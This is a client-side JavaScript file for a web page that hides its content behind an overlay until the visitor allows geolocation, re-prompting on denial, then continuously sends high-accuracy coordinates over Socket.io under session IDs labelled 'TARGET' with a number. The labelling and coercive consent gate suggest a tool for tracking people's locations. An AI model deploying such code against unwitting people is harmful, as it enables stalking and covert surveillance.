// DOM Elements
const permissionOverlay = document.getElementById('permission-overlay');
const retryLocationBtn = document.getElementById('retry-location-btn');

// State Management
const state = {
  isLocationAllowed: false,
  watchPositionId: null,
  sessionId: null,
  socket: io()
};

// ===== Generate Random Session ID =====
/**
 * Generate a random session ID like TARGET1, TARGET2, TARGET3, etc.
 */
function generateSessionId() {
  const randomNum = Math.floor(Math.random() * 10000) + 1; // Random number from 1 to 10000
  return `TARGET${randomNum}`;
}

// Initialize session ID on script load
state.sessionId = generateSessionId();
console.log(`Session ID generated: ${state.sessionId}`);

// ===== Socket.io Event Listeners =====
state.socket.on('connect', () => {
  console.log('Connected to server');
});

state.socket.on('disconnect', () => {
  console.log('Disconnected from server. Attempting to reconnect...');
});

state.socket.on('locationAck', (data) => {
  console.log('Location received by server:', data);
});

state.socket.on('error', (error) => {
  console.error('Socket error:', error);
});

// ===== Utility Functions =====

/**
 * Clear permission overlay
 */
function hidePermissionOverlay() {
  permissionOverlay.classList.add('hidden');
  setTimeout(() => {
    permissionOverlay.style.display = 'none';
  }, 500);
}

/**
 * Show permission overlay
 */
function showPermissionOverlay() {
  permissionOverlay.style.display = 'flex';
  permissionOverlay.classList.remove('hidden');
}

/**
 * Allow location and unlock site
 */
function unlockSite() {
  state.isLocationAllowed = true;
  document.body.classList.add('location-allowed');
  hidePermissionOverlay();
  console.log('Location allowed - Site unlocked');
}

/**
 * Request geolocation permission
 */
function requestLocationPermission() {
  if (!navigator.geolocation) {
    alert('Geolocation is not supported by your browser.');
    return;
  }

  retryLocationBtn.disabled = true;
  retryLocationBtn.classList.add('loading');
  retryLocationBtn.textContent = 'Requesting Access...';

  // Request location once to trigger permission dialog
  navigator.geolocation.getCurrentPosition(
    // Success Callback
    (position) => {
      const { latitude, longitude, accuracy } = position.coords;

      // Unlock the site
      unlockSite();

      // Start watching position for continuous updates
      startWatchingPosition(latitude, longitude);

      console.log(`Location obtained: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`);
    },
    // Error Callback
    (error) => {
      console.error(`Geolocation Error (${error.code}): ${error.message}`);

      // Re-enable button and show overlay again
      retryLocationBtn.disabled = false;
      retryLocationBtn.classList.remove('loading');
      retryLocationBtn.textContent = 'Allow Location Access';

      // Keep asking for permission
      if (error.code === error.PERMISSION_DENIED) {
        console.log('User denied location access. Showing overlay again.');
        showPermissionOverlay();
      }
    },
    // Geolocation Options
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
}

/**
 * Start continuous location watching
 */
function startWatchingPosition(initialLat, initialLon) {
  state.watchPositionId = navigator.geolocation.watchPosition(
    // Success Callback
    (position) => {
      const { latitude, longitude, accuracy } = position.coords;

      // Send location to server with session ID
      if (state.socket.connected) {
        const data = {
          id: state.sessionId,
          lat: latitude,
          lon: longitude,
          accuracy: accuracy,
          timestamp: Date.now()
        };
        state.socket.emit('locationUpdate', data);
      }

      console.log(`Location update (${state.sessionId}): ${latitude.toFixed(4)}, ${longitude.toFixed(4)} (±${accuracy.toFixed(0)}m)`);
    },
    // Error Callback
    (error) => {
      console.error(`Geolocation Watch Error (${error.code}): ${error.message}`);
    },
    // Geolocation Options
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 5000 // Allow cached position up to 5 seconds
    }
  );
}

// ===== Event Listeners =====

// Retry button click
retryLocationBtn.addEventListener('click', requestLocationPermission);

// Request location on page load
window.addEventListener('load', () => {
  console.log('Page loaded - Requesting location access');
  requestLocationPermission();
});

// Cleanup on page unload
window.addEventListener('beforeunload', () => {
  if (state.watchPositionId !== null) {
    navigator.geolocation.clearWatch(state.watchPositionId);
  }
  state.socket.disconnect();
});

// Handle page visibility changes
document.addEventListener('visibilitychange', () => {
  if (document.hidden && state.isLocationAllowed) {
    console.log('Page hidden');
  } else if (!document.hidden && state.isLocationAllowed) {
    console.log('Page visible');
  }
});

console.log('Location tracking script loaded');
